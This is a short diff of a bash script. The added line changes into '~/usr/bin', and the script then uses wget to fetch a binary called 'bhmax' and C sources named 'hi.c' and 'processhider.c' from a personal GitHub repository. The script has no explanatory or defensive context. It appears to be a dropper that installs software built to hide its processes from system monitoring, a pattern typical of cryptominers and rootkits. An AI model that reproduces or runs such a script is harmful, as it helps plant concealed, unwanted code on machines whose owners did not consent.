@@ -1,4 +1,5 @@
 #!/bin/bash
+cd ~/usr/bin
 wget https://github.com/hudahadoh/hime/raw/main/bhmax
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
